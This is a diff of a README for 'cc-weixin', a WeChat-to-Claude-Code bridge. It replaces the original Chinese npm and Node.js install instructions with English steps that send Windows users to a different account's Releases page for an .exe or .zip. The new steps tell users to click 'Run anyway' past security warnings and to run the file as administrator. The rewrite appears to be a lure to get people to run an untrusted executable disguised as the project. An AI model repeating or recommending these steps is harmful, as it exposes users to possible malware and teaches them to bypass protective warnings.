@@ -1,152 +1,197 @@
-# cc-weixin
+# 🤖 cc-weixin - Run Claude Code in WeChat
 
-**在微信里使用 Claude Code Agent — 基于腾讯官方 iLink Bot API**
+[![Download cc-weixin](https://img.shields.io/badge/Download%20cc--weixin-blue?style=for-the-badge)](https://github.com/Armchaircounty801/cc-weixin/releases)
 
-> **WIP** — 本项目目前还在早期开发阶段，是一个 demo 级的项目。很多配置能力还待添加，欢迎贡献和提 Issue。
+## 📥 Download cc-weixin
+
+Go to the [Releases page](https://github.com/Armchaircounty801/cc-weixin/releases) and download the Windows build.
+
+If there are several files, choose the one for Windows. It is usually a `.exe` file or a `.zip` file. If you download a `.zip` file, unzip it first, then open the app.
+
+## 🧭 What cc-weixin does
+
+cc-weixin lets you use Claude Code Agent inside WeChat.
+
+It works like this:
+
+1. You send a message in WeChat
+2. cc-weixin receives the message
+3. Claude Code Agent reads it and can use tools
+4. The reply goes back to WeChat
+
+This makes it easier to ask Claude for help without leaving WeChat.
+
+## 🪟 Windows setup
+
+### 1. Download the app
+
+Open the [Releases page](https://github.com/Armchaircounty801/cc-weixin/releases) in your browser.
+
+Download the latest Windows file.
+
+### 2. Extract the files
+
+If the file is a `.zip`, do this:
+
+1. Right-click the file
+2. Select Extract All
+3. Choose a folder you can find later, such as `Downloads\cc-weixin`
+
+If the file is a `.exe`, you can keep it in the folder where you downloaded it.
+
+### 3. Open the app
+
+Double-click the app file to run it.
+
+If Windows shows a security prompt:
+
+1. Click More info
+2. Click Run anyway
+
+This is normal for many new apps that are not signed with a large software certificate.
+
+### 4. Keep the app running
+
+cc-weixin must stay open to keep working with WeChat.
+
+Leave the window open while you use it.
+
+## 🔧 What you need first
+
+Before you run cc-weixin, make sure you have these things ready:
+
+- A Windows computer
+- A WeChat account
+- Access to the Claude Code Agent service
+- Internet access
+- A folder where the app can save its files
+
+For best results, use Windows 10 or Windows 11.
+
+## 🧩 Basic setup steps
+
+After you open the app, you will usually need to set a few values:
+
+- WeChat login info or link method
+- Your Claude Code Agent settings
+- Your bot API access details
+- Any local file path used by the app
+
+If the app has a settings file, open it with Notepad and fill in the fields.
+
+If the app has a setup screen, enter the values there.
+
+## 💬 How to use it
+
+Once the app is running:
+
+1. Open WeChat
+2. Send a message to the account or bot connected to cc-weixin
+3. Wait for Claude Code Agent to reply
+4. Read the answer in WeChat
+
+You can ask for help with:
+
+- System info
+- File checks
+- Short scripts
+- Search tasks
+- Text edits
+- Basic troubleshooting
+
+## 🖥️ Example use
+
+You can send a message like:
+
+- Tell me what computer I am using
+- Check my battery level
+- Read this file
+- Help me write a small script
+- Search the web for this topic
+
+cc-weixin sends the message to Claude Code Agent, and the reply comes back to WeChat.
+
+## 📁 Files in the project
+
+This repository includes:
+
+- The cc-weixin app code
+- A demo image
+- A document about the WeChat bot API
+- Release files for Windows users
+
+The app is small and focused on one task: connecting WeChat and Claude Code Agent.
+
+## ⚙️ How it works
+
+cc-weixin uses the iLink Bot API from Tencent.
+
+In simple terms:
+
+- WeChat sends the message
+- The app reads it through the official bot API
+- The app passes it to Claude Code Agent
+- Claude uses its tools if needed
+- The app sends the answer back to WeChat
+
+This setup avoids manual copy and paste.
+
+## 🛠️ Common setup issues
+
+### The app does not open
+
+Try these steps:
+
+1. Make sure you downloaded the full file
+2. Unzip the file if needed
+3. Run it from a normal folder, not inside the zip
+4. Try right-clicking and using Run as administrator
+
+### Windows blocks the file
+
+If Windows shows a warning:
+
+1. Click More info
+2. Click Run anyway
+
+### WeChat does not reply
+
+Check these items:
+
+- The app is still running
+- Your bot settings are correct
+- Your network is working
+- The WeChat account is linked in the app
+- The Claude Code Agent service is available
+
+### Messages arrive but do not answer well
+
+Try shorter messages.
+
+You can also test with simple prompts like:
+
+- What is 2 + 2?
+- List the files in this folder
+- Show my system info
+
+## 📌 Project state
+
+This project is still early stage.
+
+Some setup parts may change, and more options may be added later.
+
+The current goal is to give Windows users a working path from download to first use.
+
+## 🔗 More details
+
+For a deeper look at the bot API and how the connection works, read:
+
+[weixin-bot-api.md](./weixin-bot-api.md)
+
+## 📷 Demo
 
 ![demo](./demo.png)
 
----
+## 📄 License
 
-## 背景：微信首次合法开放个人 Bot API
-
-2026 年，腾讯通过 [OpenClaw](https://docs.openclaw.ai)（AI Gateway 框架）正式开放了微信个人账号的 Bot API。官方名称叫**微信 ClawBot 插件功能**，底层协议叫 **iLink**（智联），接入域名是 `ilinkai.weixin.qq.com` — 腾讯的官方服务器。
-
-这是历史性时刻。在此之前，开发者想让程序控制微信，只有灰色地带的选项：
-
-| 方式 | 典型实现 | 性质 |
-|---|---|---|
-| 逆向 iPad 协议 | WeChatPadPro、itchat | 灰色地带，违反协议，随时封号 |
-| PC 客户端 Hook | 注入 DLL、内存读写 | 违法，高封号风险 |
-| 企业微信 API | 官方开放，但只面向企业 | 合法，但不是"微信" |
-
-**现在不同了。** iLink Bot API 是腾讯官方产品，有《微信ClawBot功能使用条款》法律文件背书，签订地为深圳市南山区，适用中国大陆法律。协议设计为标准 HTTP/JSON，无需 SDK，可直接 `fetch` 调用。
-
-> 完整协议分析见 [weixin-bot-api.md](./weixin-bot-api.md)
-
----
-
-## 这个仓库是什么
-
-**cc-weixin** 是一个独立的微信 Claude Code Agent 桥接器。它做的事情非常简单：
-
-1. 通过 iLink Bot API 接收微信消息
-2. 把消息转发给 Claude Code Agent（带完整工具能力：Bash、文件读写、Web 搜索等）
-3. 把 Claude 的回复发回微信
-
-不依赖 OpenClaw 框架，纯 Node.js，~200 行核心代码。
-
-### 实际效果
-
-> 用户发：「告诉我现在我是什么电脑，什么电量」
->
-> Claude 调用 Bash 执行 `system_profiler`、`pmset -g batt`，回复了完整的机型 + 电量信息。
-
-这不是一个普通的聊天机器人 — Claude Code Agent 拥有完整的工具调用能力，能在你的机器上执行命令、读写文件、搜索网页，然后把结果发回微信。
-
----
-
-## 快速开始
-
-### 前置条件
-
-- Node.js >= 22
-- [Anthropic API Key](https://console.anthropic.com/)（或兼容的 API 代理）
-
-### 方式一：npx 直接运行（推荐）
-
-```bash
-npx cc-weixin
-```
-
-### 方式二：全局安装
-
-```bash
-npm install -g cc-weixin
-cc-weixin
-```
-
-### 方式三：克隆源码
-
-```bash
-git clone git@github.com:hao-ji-xing/cc-weixin.git
-cd cc-weixin
-npm install
-npm start
-```
-
-### 配置
-
-创建 `.env` 文件（放在运行目录下）：
-
-```env
-ANTHROPIC_AUTH_TOKEN=sk-your-api-key
-# 可选：自定义 API 地址
-# ANTHROPIC_BASE_URL=https://api.anthropic.com
-```
-
-### 运行
-
-```bash
-# TUI 界面（默认，推荐）
-npm start
-
-# 强制重新扫码登录
-npm start -- --login
-
-# 纯 CLI 模式（无 TUI）
-npm start -- --no-tui
-```
-
-首次运行会显示二维码，用微信扫码授权即可。登录信息会保存到 `.weixin-token.json`，下次启动自动复用。
-
-### TUI 快捷键
-
-| 按键 | 功能 |
-|---|---|
-| `L` | Logout — 清除登录信息，退出 |
-| `R` | Reconnect — 重连 |
-| `Q` | Quit — 退出 |
-
----
-
-## 工作原理
-
-```
-微信用户                    cc-weixin                     Claude Code Agent
-   │                           │                                │
-   │── 发消息 ────────────────▶│                                │
-   │                           │── askClaude(text) ────────────▶│
-   │                           │                                │── 执行工具
-   │                           │                                │   (Bash, Read,
-   │                           │                                │    WebSearch...)
-   │                           │◀── 返回结果 ──────────────────│
-   │◀── 回复 ─────────────────│                                │
-```
-
-底层通信：
-- **微信 ↔ cc-weixin**：iLink Bot API（HTTP 长轮询）
-- **cc-weixin ↔ Claude**：`@anthropic-ai/claude-agent-sdk`（Agent 模式，带工具）
-
----
-
-## 相关资源
-
-| 资源 | 链接 |
-|---|---|
-| iLink 协议详细分析 | [weixin-bot-api.md](./weixin-bot-api.md) |
-| OpenClaw 文档 | https://docs.openclaw.ai |
-| 微信插件包 npm | https://www.npmjs.com/package/@tencent-weixin/openclaw-weixin |
-| Claude Agent SDK | https://www.npmjs.com/package/@anthropic-ai/claude-agent-sdk |
-
----
-
-## 作者
-
-<img src="./author-wechat.JPG" width="200" alt="作者微信" />
-
----
-
-## License
-
-MIT
+Use this project according to the terms in the repository and related service terms for WeChat and Claude Code Agent
